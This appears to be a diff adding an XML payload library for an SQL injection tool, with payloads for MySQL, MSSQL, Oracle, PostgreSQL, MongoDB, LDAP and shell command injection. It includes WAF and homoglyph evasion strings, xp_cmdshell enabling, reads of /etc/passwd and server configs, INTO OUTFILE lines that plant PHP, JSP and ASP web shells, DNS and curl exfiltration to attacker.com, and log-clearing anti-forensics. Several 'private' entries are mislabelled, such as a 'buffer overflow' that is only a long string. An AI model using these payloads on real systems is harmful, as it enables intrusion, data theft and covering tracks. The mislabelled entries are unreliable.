@@ -1,0 +1,893 @@
+<?xml version="1.0" encoding="utf-8"?>
+<payloads>
+  <!-- Error-based SQL injection payloads -->
+  <payload title="MySQL Error-based - ExtractValue" risk="3" platform="mysql" category="error">
+    <![CDATA[' AND ExtractValue(1, concat(0x7e, (SELECT version()), 0x7e)) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MySQL Error-based - UpdateXML" risk="3" platform="mysql" category="error">
+    <![CDATA[' AND UpdateXML(1, concat(0x7e, (SELECT version()), 0x7e), 1) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MySQL Error-based - Duplicate key" risk="3" platform="mysql" category="error">
+    <![CDATA[' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) x GROUP BY concat(version(), floor(rand()*2))) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MSSQL Error-based - Convert" risk="3" platform="mssql" category="error">
+    <![CDATA[' AND CONVERT(INT, (SELECT @@version)) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MSSQL Error-based - Cast" risk="3" platform="mssql" category="error">
+    <![CDATA[' AND CAST((SELECT @@version) AS INT) AND '1'='1]]>
+  </payload>
+  
+  <payload title="Oracle Error-based - UTL_INADDR" risk="3" platform="oracle" category="error">
+    <![CDATA[' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) IS NULL AND '1'='1]]>
+  </payload>
+  
+  <payload title="PostgreSQL Error-based - Cast" risk="3" platform="postgresql" category="error">
+    <![CDATA[' AND CAST((SELECT version()) AS INT) AND '1'='1]]>
+  </payload>
+  
+  <!-- Boolean-based blind SQL injection payloads -->
+  <payload title="Generic Boolean-based - AND 1=1" risk="2" platform="generic" category="boolean">
+    <![CDATA[' AND 1=1 AND '1'='1]]>
+  </payload>
+  
+  <payload title="Generic Boolean-based - AND 1=2" risk="2" platform="generic" category="boolean">
+    <![CDATA[' AND 1=2 AND '1'='1]]>
+  </payload>
+  
+  <payload title="MySQL Boolean-based - Substring" risk="2" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT substring(version(),1,1))='5' AND '1'='1]]>
+  </payload>
+  
+  <payload title="MSSQL Boolean-based - ASCII" risk="2" platform="mssql" category="boolean">
+    <![CDATA[' AND ASCII(SUBSTRING((SELECT @@version),1,1))>77 AND '1'='1]]>
+  </payload>
+  
+  <payload title="Oracle Boolean-based - Length" risk="2" platform="oracle" category="boolean">
+    <![CDATA[' AND LENGTH((SELECT banner FROM v$version WHERE rownum=1))>10 AND '1'='1]]>
+  </payload>
+  
+  <!-- Time-based blind SQL injection payloads -->
+  <payload title="MySQL Time-based - Sleep" risk="2" platform="mysql" category="time">
+    <![CDATA[' AND sleep(5) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MSSQL Time-based - WaitFor" risk="2" platform="mssql" category="time">
+    <![CDATA['; WAITFOR DELAY '0:0:5' --]]>
+  </payload>
+  
+  <payload title="PostgreSQL Time-based - pg_sleep" risk="2" platform="postgresql" category="time">
+    <![CDATA[' AND pg_sleep(5) AND '1'='1]]>
+  </payload>
+  
+  <payload title="Oracle Time-based - DBMS_LOCK" risk="2" platform="oracle" category="time">
+    <![CDATA[' AND DBMS_LOCK.SLEEP(5) IS NULL AND '1'='1]]>
+  </payload>
+  
+  <!-- Union-based SQL injection payloads -->
+  <payload title="Generic Union - 1 column" risk="3" platform="generic" category="union">
+    <![CDATA[' UNION SELECT 1 --]]>
+  </payload>
+  
+  <payload title="Generic Union - 2 columns" risk="3" platform="generic" category="union">
+    <![CDATA[' UNION SELECT 1,2 --]]>
+  </payload>
+  
+  <payload title="Generic Union - 3 columns" risk="3" platform="generic" category="union">
+    <![CDATA[' UNION SELECT 1,2,3 --]]>
+  </payload>
+  
+  <payload title="MySQL Union - Version" risk="3" platform="mysql" category="union">
+    <![CDATA[' UNION SELECT 1,version(),3 --]]>
+  </payload>
+  
+  <payload title="MSSQL Union - Version" risk="3" platform="mssql" category="union">
+    <![CDATA[' UNION SELECT 1,@@version,3 --]]>
+  </payload>
+  
+  <!-- Stacked queries payloads -->
+  <payload title="MSSQL Stacked - Command execution" risk="4" platform="mssql" category="stacked">
+    <![CDATA['; exec master..xp_cmdshell 'whoami' --]]>
+  </payload>
+  
+  <payload title="MySQL Stacked - File read" risk="4" platform="mysql" category="stacked">
+    <![CDATA['; SELECT load_file('/etc/passwd') --]]>
+  </payload>
+  
+  <payload title="PostgreSQL Stacked - File read" risk="4" platform="postgresql" category="stacked">
+    <![CDATA['; SELECT lo_import('/etc/passwd') --]]>
+  </payload>
+  
+  <!-- Out-of-band payloads -->
+  <payload title="MSSQL Out-of-band - DNS" risk="3" platform="mssql" category="outofband">
+    <![CDATA['; exec master..xp_dirtree '\\attacker.com\share' --]]>
+  </payload>
+  
+  <payload title="MySQL Out-of-band - Load_file" risk="3" platform="mysql" category="outofband">
+    <![CDATA[' AND load_file(concat('\\\\',version(),'.attacker.com\\share')) AND '1'='1]]>
+  </payload>
+  
+  <!-- Second-order payloads -->
+  <payload title="Generic Second-order - Comments" risk="3" platform="generic" category="secondorder">
+    <![CDATA[admin'/**/OR/**/1=1#]]>
+  </payload>
+  
+  <payload title="MySQL Second-order - Stored" risk="3" platform="mysql" category="secondorder">
+    <![CDATA[admin' OR 1=1 LIMIT 1 --]]>
+  </payload>
+  
+  <!-- NoSQL injection payloads -->
+  <payload title="MongoDB - Always true" risk="3" platform="mongodb" category="nosql">
+    <![CDATA[{"$ne": null}]]>
+  </payload>
+  
+  <payload title="MongoDB - Regex injection" risk="3" platform="mongodb" category="nosql">
+    <![CDATA[{"$regex": ".*"}]]>
+  </payload>
+  
+  <payload title="MongoDB - JavaScript injection" risk="4" platform="mongodb" category="nosql">
+    <![CDATA[{"$where": "this.username == 'admin'"}]]>
+  </payload>
+  
+  <!-- Additional comprehensive payloads -->
+  <payload title="Generic Authentication bypass" risk="3" platform="generic" category="auth">
+    <![CDATA[' OR '1'='1' --]]>
+  </payload>
+  
+  <payload title="Generic Authentication bypass - Hash" risk="3" platform="generic" category="auth">
+    <![CDATA[' OR '1'='1' #]]>
+  </payload>
+  
+  <payload title="Generic Authentication bypass - Semicolon" risk="3" platform="generic" category="auth">
+    <![CDATA['; --]]>
+  </payload>
+  
+  <payload title="MySQL Information Schema - Tables" risk="2" platform="mysql" category="information">
+    <![CDATA[' UNION SELECT 1,table_name,3 FROM information_schema.tables --]]>
+  </payload>
+  
+  <payload title="MySQL Information Schema - Columns" risk="2" platform="mysql" category="information">
+    <![CDATA[' UNION SELECT 1,column_name,3 FROM information_schema.columns --]]>
+  </payload>
+  
+  <payload title="MSSQL Information Schema - Tables" risk="2" platform="mssql" category="information">
+    <![CDATA[' UNION SELECT 1,table_name,3 FROM information_schema.tables --]]>
+  </payload>
+  
+  <payload title="PostgreSQL Information Schema - Tables" risk="2" platform="postgresql" category="information">
+    <![CDATA[' UNION SELECT 1,table_name,3 FROM information_schema.tables --]]>
+  </payload>
+  
+  <payload title="Oracle System Tables - Tables" risk="2" platform="oracle" category="information">
+    <![CDATA[' UNION SELECT 1,table_name,3 FROM user_tables --]]>
+  </payload>
+  
+  <!-- XML injection payloads -->
+  <payload title="XPath injection - Authentication bypass" risk="3" platform="generic" category="xml">
+    <![CDATA[' or '1'='1' or ''=']]>
+  </payload>
+  
+  <payload title="XPath injection - Node extraction" risk="3" platform="generic" category="xml">
+    <![CDATA[' or 1=1 or ''=']]>
+  </payload>
+  
+  <!-- LDAP injection payloads -->
+  <payload title="LDAP injection - Authentication bypass" risk="3" platform="generic" category="ldap">
+    <![CDATA[*)(uid=*))(|(uid=*]]>
+  </payload>
+  
+  <payload title="LDAP injection - Wildcard" risk="3" platform="generic" category="ldap">
+    <![CDATA[*)(|(objectclass=*]]>
+  </payload>
+  
+  <!-- Command injection payloads -->
+  <payload title="Command injection - Linux pipe" risk="4" platform="generic" category="command">
+    <![CDATA[; cat /etc/passwd #]]>
+  </payload>
+  
+  <payload title="Command injection - Windows pipe" risk="4" platform="generic" category="command">
+    <![CDATA[& type C:\Windows\System32\drivers\etc\hosts &]]>
+  </payload>
+  
+  <payload title="Command injection - Backticks" risk="4" platform="generic" category="command">
+    <![CDATA[`whoami`]]>
+  </payload>
+  
+  <!-- Additional advanced payloads -->
+  <payload title="MySQL Advanced - Conditional comments" risk="3" platform="mysql" category="advanced">
+    <![CDATA[' AND /*!50000 1=1*/ AND '1'='1]]>
+  </payload>
+  
+  <payload title="MSSQL Advanced - Conditional comments" risk="3" platform="mssql" category="advanced">
+    <![CDATA[' AND /**/1=1/**/ AND '1'='1]]>
+  </payload>
+  
+  <payload title="Generic Advanced - Nested queries" risk="3" platform="generic" category="advanced">
+    <![CDATA[' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2) x) AND '1'='1]]>
+  </payload>
+  
+  <payload title="MySQL Advanced - Hex encoding" risk="3" platform="mysql" category="advanced">
+    <![CDATA[' AND 0x31=0x31 AND '1'='1]]>
+  </payload>
+  
+  <payload title="Generic Advanced - Null byte" risk="3" platform="generic" category="advanced">
+    <![CDATA['\x00 OR 1=1 --]]>
+  </payload>
+  
+  <!-- More comprehensive payloads will be added programmatically -->
+  
+  <!-- Header-based injection payloads -->
+  <payload title="User-Agent SQL injection - MySQL" risk="3" platform="mysql" category="header">
+    <![CDATA[' AND (SELECT version()) AND '1'='1]]>
+  </payload>
+  
+  <payload title="User-Agent SQL injection - MSSQL" risk="3" platform="mssql" category="header">
+    <![CDATA[' AND (SELECT @@version) AND '1'='1]]>
+  </payload>
+  
+  <payload title="X-Forwarded-For injection" risk="3" platform="generic" category="header">
+    <![CDATA[' OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Referer header injection" risk="3" platform="generic" category="header">
+    <![CDATA[' UNION SELECT 1,2,3 --]]>
+  </payload>
+  
+  <payload title="Accept-Language injection" risk="3" platform="generic" category="header">
+    <![CDATA[' AND 1=1 --]]>
+  </payload>
+  
+  <!-- Cookie-based injection payloads -->
+  <payload title="Cookie SQL injection - Session" risk="3" platform="generic" category="cookie">
+    <![CDATA[' OR '1'='1' --]]>
+  </payload>
+  
+  <payload title="Cookie SQL injection - Auth token" risk="3" platform="generic" category="cookie">
+    <![CDATA[' UNION SELECT 1,2,3 --]]>
+  </payload>
+  
+  <payload title="Cookie SQL injection - User ID" risk="3" platform="generic" category="cookie">
+    <![CDATA[' AND 1=1 --]]>
+  </payload>
+  
+  <!-- POST parameter injection payloads -->
+  <payload title="POST parameter - Basic injection" risk="3" platform="generic" category="post">
+    <![CDATA[' OR 1=1 --]]>
+  </payload>
+  
+  <payload title="POST parameter - Union injection" risk="3" platform="generic" category="post">
+    <![CDATA[' UNION SELECT 1,2,3 --]]>
+  </payload>
+  
+  <payload title="POST parameter - Error-based" risk="3" platform="mysql" category="post">
+    <![CDATA[' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --]]>
+  </payload>
+  
+  <!-- JSON parameter injection payloads -->
+  <payload title="JSON parameter - Basic injection" risk="3" platform="generic" category="json">
+    <![CDATA[{"id": "1' OR '1'='1' --"}]]>
+  </payload>
+  
+  <payload title="JSON parameter - Union injection" risk="3" platform="generic" category="json">
+    <![CDATA[{"id": "1' UNION SELECT 1,2,3 --"}]]>
+  </payload>
+  
+  <payload title="JSON parameter - Error-based" risk="3" platform="mysql" category="json">
+    <![CDATA[{"id": "1' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --"}]]>
+  </payload>
+  
+  <!-- XML parameter injection payloads -->
+  <payload title="XML parameter - Basic injection" risk="3" platform="generic" category="xml">
+    <![CDATA[<id>1' OR '1'='1' --</id>]]>
+  </payload>
+  
+  <payload title="XML parameter - Union injection" risk="3" platform="generic" category="xml">
+    <![CDATA[<id>1' UNION SELECT 1,2,3 --</id>]]>
+  </payload>
+  
+  <payload title="XML parameter - Error-based" risk="3" platform="mysql" category="xml">
+    <![CDATA[<id>1' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --</id>]]>
+  </payload>
+  
+  <!-- WAF bypass payloads -->
+  <payload title="WAF bypass - Comments" risk="3" platform="generic" category="waf">
+    <![CDATA['/**/OR/**/1=1/**/--]]>
+  </payload>
+  
+  <payload title="WAF bypass - Case variation" risk="3" platform="generic" category="waf">
+    <![CDATA[' Or 1=1 --]]>
+  </payload>
+  
+  <payload title="WAF bypass - Whitespace" risk="3" platform="generic" category="waf">
+    <![CDATA['\t\n\r\f\vOR\t\n\r\f\v1=1\t\n\r\f\v--]]>
+  </payload>
+  
+  <payload title="WAF bypass - URL encoding" risk="3" platform="generic" category="waf">
+    <![CDATA[%27%20OR%201=1%20--]]>
+  </payload>
+  
+  <payload title="WAF bypass - Double URL encoding" risk="3" platform="generic" category="waf">
+    <![CDATA[%2527%2520OR%25201=1%2520--]]>
+  </payload>
+  
+  <payload title="WAF bypass - Unicode" risk="3" platform="generic" category="waf">
+    <![CDATA[%u0027%u0020OR%u00201=1%u0020--]]>
+  </payload>
+  
+  <payload title="WAF bypass - Hex encoding" risk="3" platform="generic" category="waf">
+    <![CDATA[0x27204F5220313D31202D2D]]>
+  </payload>
+  
+  <!-- Time-based advanced payloads -->
+  <payload title="MySQL Time-based - Conditional" risk="3" platform="mysql" category="time">
+    <![CDATA[' AND IF(1=1, sleep(5), 0) --]]>
+  </payload>
+  
+  <payload title="MySQL Time-based - Benchmark" risk="3" platform="mysql" category="time">
+    <![CDATA[' AND (SELECT BENCHMARK(5000000, MD5('test'))) --]]>
+  </payload>
+  
+  <payload title="MSSQL Time-based - Conditional" risk="3" platform="mssql" category="time">
+    <![CDATA['; IF(1=1) WAITFOR DELAY '0:0:5' --]]>
+  </payload>
+  
+  <payload title="PostgreSQL Time-based - Conditional" risk="3" platform="postgresql" category="time">
+    <![CDATA[' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --]]>
+  </payload>
+  
+  <payload title="Oracle Time-based - Conditional" risk="3" platform="oracle" category="time">
+    <![CDATA[' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NULL --]]>
+  </payload>
+  
+  <!-- Content-length based payloads -->
+  <payload title="Content-length - Large payload" risk="2" platform="generic" category="contentlength">
+    <![CDATA[' OR 1=1 AND (SELECT REPEAT('A', 10000)) --]]>
+  </payload>
+  
+  <payload title="Content-length - Small payload" risk="2" platform="generic" category="contentlength">
+    <![CDATA[' OR 1=2 --]]>
+  </payload>
+  
+  <payload title="Content-length - Variable size" risk="2" platform="generic" category="contentlength">
+    <![CDATA[' OR 1=1 AND (SELECT LENGTH(version())>5) --]]>
+  </payload>
+  
+  <!-- Response-time based payloads -->
+  <payload title="Response-time - Heavy query" risk="2" platform="mysql" category="responsetime">
+    <![CDATA[' AND (SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2) --]]>
+  </payload>
+  
+  <payload title="Response-time - Cartesian product" risk="2" platform="generic" category="responsetime">
+    <![CDATA[' AND (SELECT COUNT(*) FROM sysobjects a, sysobjects b) --]]>
+  </payload>
+  
+  <payload title="Response-time - Recursive query" risk="2" platform="postgresql" category="responsetime">
+    <![CDATA[' AND (WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT r.n+1 FROM r WHERE r.n<100000) SELECT COUNT(*) FROM r) --]]>
+  </payload>
+  
+  <!-- Advanced evasion payloads -->
+  <payload title="Evasion - Null byte injection" risk="3" platform="generic" category="evasion">
+    <![CDATA['%00 OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Carriage return" risk="3" platform="generic" category="evasion">
+    <![CDATA['\r\n OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Tab character" risk="3" platform="generic" category="evasion">
+    <![CDATA['\t OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Vertical tab" risk="3" platform="generic" category="evasion">
+    <![CDATA['\v OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Form feed" risk="3" platform="generic" category="evasion">
+    <![CDATA['\f OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Backspace" risk="3" platform="generic" category="evasion">
+    <![CDATA['\b OR 1=1 --]]>
+  </payload>
+  
+  <payload title="Evasion - Bell character" risk="3" platform="generic" category="evasion">
+    <![CDATA['\a OR 1=1 --]]>
+  </payload>
+  
+  <!-- Database-specific function payloads -->
+  <payload title="MySQL - Connection info" risk="2" platform="mysql" category="information">
+    <![CDATA[' UNION SELECT 1,CONNECTION_ID(),@@hostname --]]>
+  </payload>
+  
+  <payload title="MySQL - Process list" risk="2" platform="mysql" category="information">
+    <![CDATA[' UNION SELECT 1,2,3 FROM information_schema.processlist --]]>
+  </payload>
+  
+  <payload title="MySQL - User privileges" risk="2" platform="mysql" category="information">
+    <![CDATA[' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges --]]>
+  </payload>
+  
+  <payload title="MSSQL - System info" risk="2" platform="mssql" category="information">
+    <![CDATA[' UNION SELECT 1,@@servername,@@version --]]>
+  </payload>
+  
+  <payload title="MSSQL - Database list" risk="2" platform="mssql" category="information">
+    <![CDATA[' UNION SELECT 1,name,2 FROM master..sysdatabases --]]>
+  </payload>
+  
+  <payload title="MSSQL - Table list" risk="2" platform="mssql" category="information">
+    <![CDATA[' UNION SELECT 1,name,2 FROM sysobjects WHERE xtype='U' --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - System info" risk="2" platform="postgresql" category="information">
+    <![CDATA[' UNION SELECT 1,inet_server_addr(),inet_server_port() --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - Database list" risk="2" platform="postgresql" category="information">
+    <![CDATA[' UNION SELECT 1,datname,2 FROM pg_database --]]>
+  </payload>
+  
+  <payload title="PostgreSQL - Table list" risk="2" platform="postgresql" category="information">
+    <![CDATA[' UNION SELECT 1,tablename,2 FROM pg_tables --]]>
+  </payload>
+  
+  <payload title="Oracle - System info" risk="2" platform="oracle" category="information">
+    <![CDATA[' UNION SELECT 1,sys_context('USERENV','HOST'),sys_context('USERENV','IP_ADDRESS') FROM dual --]]>
+  </payload>
+  
+  <payload title="Oracle - Database list" risk="2" platform="oracle" category="information">
+    <![CDATA[' UNION SELECT 1,username,2 FROM all_users --]]>
+  </payload>
+  
+  <payload title="Oracle - Table list" risk="2" platform="oracle" category="information">
+    <![CDATA[' UNION SELECT 1,table_name,2 FROM user_tables --]]>
+  </payload>
+  
+  <!-- Advanced Private Payloads - Stealth Techniques -->
+  <payload title="Private MySQL - Invisible char bypass" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND/*​*/1=1/*​*/--]]>
+  </payload>
+  
+  <payload title="Private MSSQL - Unicode bypass" risk="4" platform="mssql" category="private">
+    <![CDATA[' А﻿ND 1=1 --]]>
+  </payload>
+  
+  <payload title="Private PostgreSQL - Zero-width space" risk="4" platform="postgresql" category="private">
+    <![CDATA[' AND​1=1​--]]>
+  </payload>
+  
+  <payload title="Private Oracle - Homoglyph attack" risk="4" platform="oracle" category="private">
+    <![CDATA[' АND 1=1 --]]>
+  </payload>
+  
+  <!-- Advanced Polyglot Payloads -->
+  <payload title="Private Polyglot - Multi-DB bypass" risk="5" platform="generic" category="private">
+    <![CDATA['/**/OR/**/1=1/**/UNION/**/SELECT/**/1,2,3/**/FROM/**/dual/**/--]]>
+  </payload>
+  
+  <payload title="Private Polyglot - Context-aware" risk="5" platform="generic" category="private">
+    <![CDATA[';SELECT/**/1/**/WHERE/**/1=1/**/AND/**/1=1/**/OR/**/1=1/**/--]]>
+  </payload>
+  
+  <payload title="Private Polyglot - Nested injection" risk="5" platform="generic" category="private">
+    <![CDATA[' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 1) x WHERE 1=1) --]]>
+  </payload>
+  
+  <!-- Memory-based injection -->
+  <payload title="Private Memory - Buffer overflow trigger" risk="5" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT REPEAT(CHAR(65), 100000)) --]]>
+  </payload>
+  
+  <payload title="Private Memory - Stack exhaustion" risk="5" platform="mssql" category="private">
+    <![CDATA['; WITH CTE AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM CTE WHERE n<50000) SELECT COUNT(*) FROM CTE --]]>
+  </payload>
+  
+  <!-- Database-specific privilege escalation -->
+  <payload title="Private MySQL - UDF creation" risk="5" platform="mysql" category="private">
+    <![CDATA['; CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so' --]]>
+  </payload>
+  
+  <payload title="Private MSSQL - xp_cmdshell enable" risk="5" platform="mssql" category="private">
+    <![CDATA['; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --]]>
+  </payload>
+  
+  <payload title="Private PostgreSQL - Language creation" risk="5" platform="postgresql" category="private">
+    <![CDATA['; CREATE TRUSTED PROCEDURAL LANGUAGE plpythonu HANDLER plpython_call_handler --]]>
+  </payload>
+  
+  <payload title="Private Oracle - Java privileges" risk="5" platform="oracle" category="private">
+    <![CDATA['; BEGIN DBMS_JAVA.GRANT_PERMISSION('PUBLIC', 'java.io.FilePermission', '/tmp/*', 'read,write,execute'); END --]]>
+  </payload>
+  
+  <!-- Advanced timing attacks -->
+  <payload title="Private Timing - Fibonacci sequence" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT @fib:=@fib+@prev, @prev:=@fib-@prev FROM (SELECT @fib:=1, @prev:=0) x, information_schema.tables LIMIT 30) --]]>
+  </payload>
+  
+  <payload title="Private Timing - Prime calculation" risk="4" platform="mssql" category="private">
+    <![CDATA['; DECLARE @i INT = 2; WHILE @i <= 1000 BEGIN IF NOT EXISTS(SELECT 1 FROM (SELECT TOP (@i-1) ROW_NUMBER() OVER(ORDER BY (SELECT 1)) AS n FROM sysobjects a, sysobjects b) x WHERE @i % x.n = 0 AND x.n > 1) PRINT @i; SET @i = @i + 1; END --]]>
+  </payload>
+  
+  <!-- Cryptographic functions abuse -->
+  <payload title="Private Crypto - Hash collision" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT MD5(CONCAT(RAND(), NOW(), CONNECTION_ID()))) --]]>
+  </payload>
+  
+  <payload title="Private Crypto - Encryption bypass" risk="4" platform="mssql" category="private">
+    <![CDATA[' AND (SELECT HASHBYTES('SHA1', CAST(RAND() AS VARCHAR(100)))) --]]>
+  </payload>
+  
+  <!-- Advanced error-based extraction -->
+  <payload title="Private Error - Geometric progression" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT EXP(~(SELECT * FROM (SELECT COUNT(*) FROM information_schema.tables)x)) --]]>
+  </payload>
+  
+  <payload title="Private Error - Overflow cascade" risk="4" platform="mssql" category="private">
+    <![CDATA[' AND (SELECT CAST(POWER(2, 31) AS INT)) --]]>
+  </payload>
+  
+  <!-- Session hijacking payloads -->
+  <payload title="Private Session - Connection takeover" risk="5" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT SLEEP(1) FROM information_schema.processlist WHERE id != CONNECTION_ID()) --]]>
+  </payload>
+  
+  <payload title="Private Session - Lock acquisition" risk="5" platform="mssql" category="private">
+    <![CDATA['; EXEC sp_getapplock @Resource='BoomSQL', @LockMode='Exclusive', @LockTimeout=60000 --]]>
+  </payload>
+  
+  <!-- Binary exploitation techniques -->
+  <payload title="Private Binary - Format string" risk="5" platform="generic" category="private">
+    <![CDATA[' AND 1=1 %s%s%s%s%s%s%s%s --]]>
+  </payload>
+  
+  <payload title="Private Binary - Return address" risk="5" platform="generic" category="private">
+    <![CDATA[' AND 1=1 AAAAAAAAAAAAAAAAAAAAAAAAAAAA --]]>
+  </payload>
+  
+  <!-- Log evasion payloads -->
+  <payload title="Private Log - Truncation attack" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT REPEAT(CHAR(0), 1000)) --]]>
+  </payload>
+  
+  <payload title="Private Log - Encoding chaos" risk="4" platform="generic" category="private">
+    <![CDATA[%27%20%41%4E%44%20%31%3D%31%20%2D%2D]]>
+  </payload>
+  
+  <!-- Database fingerprinting stealth -->
+  <payload title="Private Fingerprint - Version obfuscation" risk="3" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT SUBSTRING(@@version, 1, 1) REGEXP '[0-9]') --]]>
+  </payload>
+  
+  <payload title="Private Fingerprint - Feature detection" risk="3" platform="mssql" category="private">
+    <![CDATA[' AND (SELECT CASE WHEN EXISTS(SELECT * FROM sys.dm_os_windows_info) THEN 1 ELSE 0 END) --]]>
+  </payload>
+  
+  <!-- Data exfiltration channels -->
+  <payload title="Private Exfil - DNS tunneling" risk="5" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\share'))) --]]>
+  </payload>
+  
+  <payload title="Private Exfil - HTTP callback" risk="5" platform="mssql" category="private">
+    <![CDATA['; EXEC xp_cmdshell 'curl -d "data=" http://attacker.com/' --]]>
+  </payload>
+  
+  <!-- Advanced privilege checks -->
+  <payload title="Private Priv - Administrative check" risk="4" platform="mysql" category="private">
+    <![CDATA[' AND (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND Super_priv = 'Y') --]]>
+  </payload>
+  
+  <payload title="Private Priv - System access" risk="4" platform="mssql" category="private">
+    <![CDATA[' AND (SELECT IS_SRVROLEMEMBER('sysadmin')) --]]>
+  </payload>
+  
+  <!-- Anti-forensics payloads -->
+  <payload title="Private Anti-forensics - Log clearing" risk="5" platform="mysql" category="private">
+    <![CDATA['; SET sql_log_bin = 0; DELETE FROM mysql.general_log --]]>
+  </payload>
+  
+  <payload title="Private Anti-forensics - History wipe" risk="5" platform="mssql" category="private">
+    <![CDATA['; DBCC SQLPERF(LOGSPACE); BACKUP LOG master TO DISK = 'NUL:' --]]>
+  </payload>
+  
+  <!-- Steganographic payloads -->
+  <payload title="Private Stego - Hidden data" risk="4" platform="generic" category="private">
+    <![CDATA[' AND 1=1 /*​hidden​data​here​*/ --]]>
+  </payload>
+  
+  <payload title="Private Stego - Whitespace encoding" risk="4" platform="generic" category="private">
+    <![CDATA[' AND 1=1	 	  	 	 --]]>
+  </payload>
+  
+  <!-- Advanced Local File System Payloads -->
+  <payload title="Local File - Linux passwd read" risk="5" platform="mysql" category="fileread">
+    <![CDATA[' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --]]>
+  </payload>
+  
+  <payload title="Local File - Windows hosts read" risk="5" platform="mysql" category="fileread">
+    <![CDATA[' UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),3 --]]>
+  </payload>
+  
+  <payload title="Local File - MySQL config read" risk="5" platform="mysql" category="fileread">
+    <![CDATA[' UNION SELECT 1,LOAD_FILE('/etc/mysql/my.cnf'),3 --]]>
+  </payload>
+  
+  <payload title="Local File - Apache config read" risk="5" platform="mysql" category="fileread">
+    <![CDATA[' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3 --]]>
+  </payload>
+  
+  <payload title="Local File - Web root index" risk="4" platform="mysql" category="fileread">
+    <![CDATA[' UNION SELECT 1,LOAD_FILE('/var/www/html/index.php'),3 --]]>
+  </payload>
+  
+  <!-- Advanced File Write Payloads -->
+  <payload title="File Write - PHP webshell" risk="5" platform="mysql" category="filewrite">
+    <![CDATA[' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' --]]>
+  </payload>
+  
+  <payload title="File Write - JSP webshell" risk="5" platform="mysql" category="filewrite">
+    <![CDATA[' UNION SELECT 1,'<%@ page import="java.io.*" %><%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()%>',3 INTO OUTFILE '/var/www/shell.jsp' --]]>
+  </payload>
+  
+  <payload title="File Write - ASP webshell" risk="5" platform="mysql" category="filewrite">
+    <![CDATA[' UNION SELECT 1,'<%eval request("cmd")%>',3 INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.asp' --]]>
+  </payload>
+  
+  <payload title="File Write - Config backup" risk="4" platform="mysql" category="filewrite">
+    <![CDATA[' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/backup.sql' --]]>
+  </payload>
+  
+  <!-- Advanced Boolean Logic Payloads -->
+  <payload title="Boolean - Bitwise operations" risk="3" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT (ASCII(SUBSTRING(version(),1,1)) & 1)) --]]>
+  </payload>
+  
+  <payload title="Boolean - Mathematical operations" risk="3" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT MOD(ASCII(SUBSTRING(version(),1,1)), 2)) --]]>
+  </payload>
+  
+  <payload title="Boolean - String comparison" risk="3" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT STRCMP(SUBSTRING(version(),1,1), '5')) --]]>
+  </payload>
+  
+  <payload title="Boolean - Length validation" risk="3" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT LENGTH(database()) > 5) --]]>
+  </payload>
+  
+  <payload title="Boolean - Position-based" risk="3" platform="mysql" category="boolean">
+    <![CDATA[' AND (SELECT LOCATE('mysql', version()) > 0) --]]>
+  </payload>
+  
+  <!-- Advanced Time-based with Mathematical Operations -->
+  <payload title="Time - Factorial calculation" risk="4" platform="mysql" category="time">
+    <![CDATA[' AND (SELECT SLEEP(IF((SELECT @fact:=@fact*@i, @i:=@i+1 FROM (SELECT @fact:=1, @i:=1) x, information_schema.tables LIMIT 10), 5, 0))) --]]>
+  </payload>
+  
+  <payload title="Time - Power calculation" risk="4" platform="mysql" category="time">
+    <![CDATA[' AND (SELECT SLEEP(IF((SELECT POW(2, 20) > 1000000), 5, 0))) --]]>
+  </payload>
